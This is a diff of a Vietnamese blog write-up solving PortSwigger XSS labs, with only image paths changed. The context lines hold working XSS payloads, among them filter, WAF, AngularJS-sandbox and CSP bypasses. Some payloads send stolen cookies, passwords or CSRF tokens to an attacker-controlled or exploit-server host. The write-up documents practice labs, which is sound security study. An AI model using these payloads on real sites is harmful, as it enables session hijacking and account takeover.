@@ -10,13 +10,13 @@ author: bumbi.203_
 
 Lab này chỉ cần dùng `alert` để nó cảnh báo.
 
-![image](/assets/images/PortSwigger/xss/image1.png)
+![image](/assets/img/PortSwigger/xss/image1.png)
 
 ## LAB02 - Stored XSS 
 
 Mình tiêm vào trong phần form feedback.
 
-![image](/assets/images/PortSwigger/xss/image2.png)
+![image](/assets/img/PortSwigger/xss/image2.png)
 
 Khi mà vào xem post thì nó sẽ popup. 
 
@@ -24,11 +24,11 @@ Khi mà vào xem post thì nó sẽ popup.
 
 Lab này có chức năng `search` thì dùng `location.search` và khi tìm kiếm thì nó sẽ gọi tới sink `document.write`. Từ đó, mình có thể viết thêm để chèn payload. 
 
-![image](/assets/images/PortSwigger/xss/image3.png)
+![image](/assets/img/PortSwigger/xss/image3.png)
 
 Cho nên mình truyền payload sau: `"><script>alert(origin)</script>`
 
-![image](/assets/images/PortSwigger/xss/image4.png)
+![image](/assets/img/PortSwigger/xss/image4.png)
  
 ## LAB04 - DOM XSS trong source `location.search` dùng sink `innerHTML`
 
@@ -36,13 +36,13 @@ Lab này liên quan đến sink `innerHTML` thì chức năng của `innerHTML` 
 
 Cho nên mình truyền payload như sau: `<img src=x onerror=alert(origin)>`
 
-![image](/assets/images/PortSwigger/xss/image5.png)
+![image](/assets/img/PortSwigger/xss/image5.png)
 
 ## LAB05 -  DOM XSS trong thuộc tính href của thẻ liên kết (anchor) sử dụng jQuery, với dữ liệu đầu vào lấy từ location.search
 
 Lab này sử dụng thẻ a để link tới 1 đường dẫn được lấy từ `returnPath`.
 
-![image](/assets/images/PortSwigger/xss/image6.png)
+![image](/assets/img/PortSwigger/xss/image6.png)
 
 Cho nên mình truyền payload như sau: `javascript:alert(origin)`. 
 
@@ -50,7 +50,7 @@ Cho nên mình truyền payload như sau: `javascript:alert(origin)`.
 
 Sau khi đọc source thì có một đoạn script như sau: 
 
-![image](/assets/images/PortSwigger/xss/image7.png)
+![image](/assets/img/PortSwigger/xss/image7.png)
 
 Mục tiêu của đoạn script này là lấy tên tiêu đề của blog sau dấu `#`, sau đó tìm kiếm các thẻ `h2` xem có trùng tên trong `blog-list` ko nếu có thì cuộn tới chỗ bài blog đó. 
 
@@ -63,27 +63,27 @@ Mình gửi 1 thẻ `iframe` chứa 1 link web và sau link đó là `#`, và th
 
 Lab này mình bị encode HTML ở các dấu `<` và `>`. Nên khi mình thử payload `<script>alert(origin)</script>` thì nó bị encoded. 
 
-![image](/assets/images/PortSwigger/xss/image8.png)
+![image](/assets/img/PortSwigger/xss/image8.png)
 
 Và payload được lưu vào trong biến `value` => nhưng nó ko filter dấu `"` nên mình truyền payload `"onmouseover="alert(origin)`
 
-![image](/assets/images/PortSwigger/xss/image9.png)
+![image](/assets/img/PortSwigger/xss/image9.png)
 
 ## LAB08 - Stored XSS 
 
 Lab này xảy ra lỗi nằm ở phần Comment. Sau khi nhập hết các trường thì ở phần nhập tên website sẽ được đưa vào trong thẻ `a` để link tới website. 
 
-![image](/assets/images/PortSwigger/xss/image10.png)
+![image](/assets/img/PortSwigger/xss/image10.png)
 
 Như vậy mình truyền payload như sau: `javascript:alert(origin)`
 
-![image](/assets/images/PortSwigger/xss/image11.png)
+![image](/assets/img/PortSwigger/xss/image11.png)
 
 ## LAB09 - Reflected XSS 
 
 Lab này tương tự như lab đã encode `<>` và `"` 
 
-![image](/assets/images/PortSwigger/xss/image12.png)
+![image](/assets/img/PortSwigger/xss/image12.png)
 
 Cho nên mình truyền payload `'; alert(origin);//`, lúc đó searchTerm sẽ là `var searchTerm = ''; alert(origin);//'`
 
@@ -91,7 +91,7 @@ Cho nên mình truyền payload `'; alert(origin);//`, lúc đó searchTerm sẽ
 
 Lab lỗi XSS nằm trong chức năng check stock, sau khi kiểm tra source thì có đoạn Script sau. 
 
-![image](/assets/images/PortSwigger/xss/image13.png)
+![image](/assets/img/PortSwigger/xss/image13.png)
 
 Có tham số `storeId` được viết vào trong `document.write('<select name="storeId"')` 
 
@@ -101,11 +101,11 @@ Nên mình truyền payload sau: `<script>alert(origin)</script>`
 
 Lab này xảy ra lỗi nằm trong thư viện AngularJS. AngularJS là một thư viện JavaScript phổ biến, dùng để quét nội dung của các nút HTML chứa thuộc tính ng-app (còn được gọi là chỉ thị AngularJS)
 
-![image](/assets/images/PortSwigger/xss/image14.png)
+![image](/assets/img/PortSwigger/xss/image14.png)
 
 Và khi mình nhập dấu `<>` và `""` thì sẽ bị encoded. Trong AngularJS nhận `{{}}` để thực hiện câu lệnh. Nên mình truyền payload `{{1+1}}`
 
-![image](/assets/images/PortSwigger/xss/image15.png)
+![image](/assets/img/PortSwigger/xss/image15.png)
 
 Cho nên mình truyền payload `{{constructor.constructor("alert(origin)")()}}` gọi tới hàm khởi tạo để có thể thực hiện payload. 
 
@@ -113,31 +113,31 @@ Cho nên mình truyền payload `{{constructor.constructor("alert(origin)")()}}`
 
 Trong lab này có chức năng search, khi dùng thì nó gọi tới endpoint `/resource/js/searchResult.js` chứa toàn bộ script xử lý. 
 
-![image](/assets/images/PortSwigger/xss/image16.png)
+![image](/assets/img/PortSwigger/xss/image16.png)
 
 Thì khi search xong nó sẽ trả về theo endpoint `search-resutl?search=` và kết quả dựa theo json. 
 
-![image](/assets/images/PortSwigger/xss/image17.png)
+![image](/assets/img/PortSwigger/xss/image17.png)
 
 Khi đó mình dựa vào endpoint `/resource/js/searchResult.js` mà truyền payload => `\"-alert(origin)}\\`
 
-![image](/assets/images/PortSwigger/xss/image18.png)
+![image](/assets/img/PortSwigger/xss/image18.png)
 
 ## LAB13 - Stored DOM XSS 
 
 Lab này nằm trong phần comment, khi mình truy cập view post sẽ gọi tới endpoint `/resources/js/loadCommentsWithVulnerableEscapeHtml.js` 
 
-![image](/assets/images/PortSwigger/xss/image19.png)
+![image](/assets/img/PortSwigger/xss/image19.png)
 
 Trong phần body của comment có xử lý escape HTML. 
 
-![image](/assets/images/PortSwigger/xss/image20.png)
+![image](/assets/img/PortSwigger/xss/image20.png)
 
 Khi mình nhập `<script>test</script>` thì nó sẽ in ra `<script>test` => nghĩa là nó xử lý tag đầu còn tag sau không xử lý encoded mà nó hiểu là đóng tag nên ko in ra. 
 
 Và nó xử lý phần comment là innerHTML.
 
-![image](/assets/images/PortSwigger/xss/image21.png)
+![image](/assets/img/PortSwigger/xss/image21.png)
 
 Nếu mình truyền payload `<><img src=x onerror=alert(origin)>` thì sẽ bypass thành công. 
 
@@ -145,23 +145,23 @@ Nếu mình truyền payload `<><img src=x onerror=alert(origin)>` thì sẽ byp
 
 Lab này xảy ra Reflected XSS ở chức năng tìm kiếm. Nhưng khi truyền `<h1>test</h1>` thì sẽ bị WAF chặn. 
 
-![image](/assets/images/PortSwigger/xss/image22.png)
+![image](/assets/img/PortSwigger/xss/image22.png)
 
 Cho nên là mình cần biết tag nào bị chặn để có thể bypass, nên mình cần brute force nó dựa theo cheatsheet sau: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 
 
-![image](/assets/images/PortSwigger/xss/image23.png)
+![image](/assets/img/PortSwigger/xss/image23.png)
 
 Sau khi tìm các tag được phép, thì cần tìm ra thuộc tính nào cho phép sử dụng. Và dùng thẻ `<body>` có chứa thuộc tính để brute-force. 
 
-![image](/assets/images/PortSwigger/xss/image24.png)
+![image](/assets/img/PortSwigger/xss/image24.png)
 
 Kết quả, sau khi tìm ra thuộc tính không bị chặn. 
 
-![image](/assets/images/PortSwigger/xss/image25.png)
+![image](/assets/img/PortSwigger/xss/image25.png)
 
 Mình thấy kha khá thuộc tính ko bị chọn => nên bóc đại 1 cái để thử. 
 
-![image](/assets/images/PortSwigger/xss/image26.png)
+![image](/assets/img/PortSwigger/xss/image26.png)
 
 Sau khi gửi tới victim thì sẽ solve lab. 
 
@@ -171,7 +171,7 @@ Khi mà tất cả các tag bị chặn, nhưng mình được dùng `custom tag
 
 Nên mình truyền payload sau: `<my-tag onfocus='alert(document.cookie)' id='x' tabindex='1'>`. Ý nghĩa là payload khi đó khi click vào chỗ kết quả search trả về sẽ popup lên. 
 
-![image](/assets/images/PortSwigger/xss/image27.png)
+![image](/assets/img/PortSwigger/xss/image27.png)
 
 Như vậy nếu gửi tới chó client thì nó sẽ ko popup lên vì client nhìu khi ko click thì sao. 
 
@@ -189,7 +189,7 @@ Và khi gửi cho client thì mình dùng `location` để nó chuyển hướng
 
 Lab này thì thẻ `svg` và một số thẻ khác được cho phép. 
 
-![image](/assets/images/PortSwigger/xss/image28.png)
+![image](/assets/img/PortSwigger/xss/image28.png)
 
 Thì `<svg>` (Scalable Vector Graphics) là một ngôn ngữ đồ họa dạng vector dùng để vẽ hình học, biểu đồ, biểu tượng, icon, hoạt cảnh (animation) v.v... trực tiếp trong HTML.
 
@@ -197,7 +197,7 @@ Cho nên mình hoàn toàn có thể truyền `<svg><animatetransform></svg>`
 
 Và thuộc tính sau khi brute-force ko bị chặn là `onbegin`
 
-![image](/assets/images/PortSwigger/xss/image29.png)
+![image](/assets/img/PortSwigger/xss/image29.png)
 
 Nên mình có thể truyền payload sau => `<svg><animatetransform onbegin='alert(origin)'></svg>` 
 
@@ -205,7 +205,7 @@ Nên mình có thể truyền payload sau => `<svg><animatetransform onbegin='al
 
 cononical link là chỉ định một URL "chuẩn" cho một trang web. Và accesskey là một thuộc tính HTML cho phép mình gán phím tắt để truy cập nhanh một phần tử HTML, thường là button, link, input,... 
 
-![image](/assets/images/PortSwigger/xss/image30.png)
+![image](/assets/img/PortSwigger/xss/image30.png)
 
 Như vậy, mình cần chèn để có ngắt chuỗi và thêm payload. 
 
@@ -215,11 +215,11 @@ Nếu mình truyền payload => `?'onclick='alert(origin)` lúc đó nó sẽ th
 
 `<link rel="canonical" href='https://0abd00d903210bcf8037bc0000dc0055.web-security-academy.net/?'onclick='alert(origin)'>`
 
-![image](/assets/images/PortSwigger/xss/image31.png)
+![image](/assets/img/PortSwigger/xss/image31.png)
 
 Sau đó, mình thêm `accesskey` vào trong payload => `?'accesskey='x' onclick='alert(origin)`
 
-![image](/assets/images/PortSwigger/xss/image32.png)
+![image](/assets/img/PortSwigger/xss/image32.png)
 
 XSS sẽ được trigger khi nạn nhân nhấn vào phím tắt
 
@@ -227,11 +227,11 @@ XSS sẽ được trigger khi nạn nhân nhấn vào phím tắt
 
 Lab này có Reflected XSS nằm ở chức năng search. Sau khi search thử và đọc source thì có một đoạn script như sau: 
 
-![image](/assets/images/PortSwigger/xss/image33.png)
+![image](/assets/img/PortSwigger/xss/image33.png)
 
 Thì đúng là mình hoàn toạn bị chặn `'` và `\`
 
-![image](/assets/images/PortSwigger/xss/image34.png)
+![image](/assets/img/PortSwigger/xss/image34.png)
 
 Nhưng mình vẫn có thể chèn `</script>` vào trước 1 lệnh `<script>alert(origin)</script>`. Do nó ko filter nên khi đó trình duyệt sẽ đóng lại khi gặp `</script>` tag đóng và sau đó thực hiện lệnh `alert` phía sau. 
 
@@ -239,21 +239,21 @@ Nhưng mình vẫn có thể chèn `</script>` vào trước 1 lệnh `<script>a
 
 Trong phần search của lab có bị dính Reflected XSS và sau đó kiểm tra source thì có đoạn script như sau: 
 
-![image](/assets/images/PortSwigger/xss/image35.png)
+![image](/assets/img/PortSwigger/xss/image35.png)
 
 Sau đó, mình thử payload đóng chuỗi `';alert(origin)//`, nhưng mình hoàn toàn bị chặn. 
 
-![image](/assets/images/PortSwigger/xss/image36.png)
+![image](/assets/img/PortSwigger/xss/image36.png)
 
 Nếu mình hoàn toàn làm cho `\'` là chuỗi thì hoàn thành được payload. Cho nên mình truyền payload => `\';alert(origin)//` 
 
-![image](/assets/images/PortSwigger/xss/image37.png)
+![image](/assets/img/PortSwigger/xss/image37.png)
 
 ## LAB20 - Stored XSS vào trong sự kiện `onclick` với dấu `<>` và `"` bị encoded HTML và thoát escape dấu `'` và `/`
 
 Lab này xảy ra lỗi XSS nằm ở phần comment. 
 
-![image](/assets/images/PortSwigger/xss/image38.png)
+![image](/assets/img/PortSwigger/xss/image38.png)
 
 Nó sẽ gọi đến `onclick` gọi đến link do người comment cung cấp thông qua hàm tracker. Nhưng nếu mình có thể tìm cách đóng chuỗi bằng `'` thì hoàn toàn ổn nhưng mình bị encoded. 
 
@@ -266,7 +266,7 @@ tracker.track('https://blah.com?'-alert(1)-'');">test</a>`
 
 Bài lab này nằm trong chức năng search nhưng nó bị filter `'`, `"`, `<>`, `\` và dấu backstick nữa. Và bài này thì dùng template literal nên mình nên xem các syntax của nó. 
 
-![image](/assets/images/PortSwigger/xss/image39.png)
+![image](/assets/img/PortSwigger/xss/image39.png)
 
 Vì vậy mình truyền payload `${}` để có thể trigger => `${alert(origin)}`
 
@@ -276,32 +276,32 @@ Lab này xảy ra Stored XSS trong phần comment. Để lấy cắp được co
 
 Dùng payload như sau => `<script>fetch("http://url/?c="+document.cookie)</script>`
 
-![image](/assets/images/PortSwigger/xss/image40.png)
+![image](/assets/img/PortSwigger/xss/image40.png)
 
 ## LAB23 - Khai thác XSS để lấy cắp password 
 
 Lab này dính XSS ở chức năng comment. Do nó hiển thị trong phần comment thông qua thẻ `<p>` nên khi mình nhập 1 thẻ `<input>` thì nó vẫn render. 
 
-![image](/assets/images/PortSwigger/xss/image41.png)
+![image](/assets/img/PortSwigger/xss/image41.png)
 
 Cho nên để lấy được password thì chỉ cần giả mạo ô nhập sau đó gửi về qua domain do attacker đã dựng sẵn. 
 
-![image](/assets/images/PortSwigger/xss/image42.png)
+![image](/assets/img/PortSwigger/xss/image42.png)
 
 Sau khi người dùng bị lừa nhấp và điền thông tin thì nhấp ra ngoài thì sự kiện onchange sẽ trigger. 
 
-![image](/assets/images/PortSwigger/xss/image43.png)
+![image](/assets/img/PortSwigger/xss/image43.png)
 
 ## LAB24 - Khai thác XSS dẫn dến CSRF 
 
 Lab này dính XSS ở phần comment, mình sẽ khai thác XSS để người dùng đến thì gửi đến endpoint thay đổi email.
 Sau khi login thì sẽ nhận được 1 csrf. 
 
-![image](/assets/images/PortSwigger/xss/image44.png)
+![image](/assets/img/PortSwigger/xss/image44.png)
  
 Thử kiểm chứng với payload đơn giản `<script>alert(origin)</script>` 
 
-![image](/assets/images/PortSwigger/xss/image45.png)
+![image](/assets/img/PortSwigger/xss/image45.png)
 
 Sau đó thực hiện payload sau:
 
@@ -333,7 +333,7 @@ Trong sandbox của AngularJS thì luôn chặn các kí tự nguy hiểm như `
 
 Khi mình nhập `<script>alert(origin)</script>` => đều bị encoded để tránh nguy hiểm. 
 
-![image](/assets/images/PortSwigger/xss/image46.png)
+![image](/assets/img/PortSwigger/xss/image46.png)
 
 Nhưng mình có thể dùng payload sau để có thể né tránh dùng chuỗi => `toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
 
@@ -359,15 +359,15 @@ Cho nên mình truyền payload sau: `<svg><a><animate attributeName=href values
 
 Sau khi mình truy cập vào 1 post và kiểm tra source thì thấy như sau: 
 
-![image](/assets/images/PortSwigger/xss/image47.png)
+![image](/assets/img/PortSwigger/xss/image47.png)
 
 Sau đó mình thử nhập 1 payload cơ bản vào `<script>alert(1337)</script>`
 
-![image](/assets/images/PortSwigger/xss/image48.png)
+![image](/assets/img/PortSwigger/xss/image48.png)
 
 Cho nên mình tìm cách đóng chuỗi bằng `'` nhưng encoded thành `&%27;` 
 
-![image](/assets/images/PortSwigger/xss/image49.png)
+![image](/assets/img/PortSwigger/xss/image49.png)
 
 Có vẻ là nó đóng được chuỗi nhưng đã bị filter mất `()` nên mình truyền payload như sau: 
 `&%27}x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
@@ -377,46 +377,46 @@ Lúc đó payload nó sẽ thành: `javascript:fetch('/analytics', {method:'post
 
 Lab này yêu cầu thực hiện reflected xss và bypass được CSP và trích CSRF token của nạn nhân. Sau đó, đổi email nạn nhân thành hacker@evil-user.net.
 
-![image](/assets/images/PortSwigger/xss/image50.png)
+![image](/assets/img/PortSwigger/xss/image50.png)
 
 Ở phần `value=""` sẽ nhận dữ liệu từ tham số `email` 
 
-![image](/assets/images/PortSwigger/xss/image51.png)
+![image](/assets/img/PortSwigger/xss/image51.png)
 
 Nên mình sẽ truyền payload đóng chuỗi như sau: `"></form><form class="login-form" name="change-email-form" action="https://EXPLOIT-SERVER-ID.exploit-server.net/log" method="GET"><button class="button" type="submit">Click me</button>`
 
 Từ đây, mình gửi nó đến nạn nhân như sau: 
 
-![image](/assets/images/PortSwigger/xss/image52.png)
+![image](/assets/img/PortSwigger/xss/image52.png)
 
 Đầu tiên là mình stored payload này lại. 
 
 Và sau đó, mình view exploit 
 
-![image](/assets/images/PortSwigger/xss/image53.png)
+![image](/assets/img/PortSwigger/xss/image53.png)
 
 Cuối cùng, gửi cho nạn nhân. Thì sau đó, mình nhận được 1 phản hồi có chứa csrf token 
 
-![image](/assets/images/PortSwigger/xss/image54.png)
+![image](/assets/img/PortSwigger/xss/image54.png)
 
 Để mà sửa lại được email thì thực hiện lại payload như sau: 
 
-![image](/assets/images/PortSwigger/xss/image55.png)
+![image](/assets/img/PortSwigger/xss/image55.png)
 
 ## LAB30 - Reflected XSS được bảo vệ bằng CSP và bypass CSP 
 
 Ở lab này khi mình tìm kiếm 1 với payload XSS `<script>alert(origin)</script>` thì sẽ nhận được csp-report như sau: 
 
-![image](/assets/images/PortSwigger/xss/image56.png)
+![image](/assets/img/PortSwigger/xss/image56.png)
 
 Thì giải thích cho cái header này như sau: 
 
-![image](/assets/images/PortSwigger/xss/image57.png)
+![image](/assets/img/PortSwigger/xss/image57.png)
 
 Vì trong header có report uri là `/csp-report?token=` cho nên mình vẫn có thể đóng lại và thêm chính sách cho payload mình hoạt động.
 
 `/?token=;script-src-elem 'unsafe-inline'&search=<script>alert(document.domain)</script>`
 
-![image](/assets/images/PortSwigger/xss/image58.png)
+![image](/assets/img/PortSwigger/xss/image58.png)
 
-![image](/assets/images/PortSwigger/xss/image59.png)
+![image](/assets/img/PortSwigger/xss/image59.png)
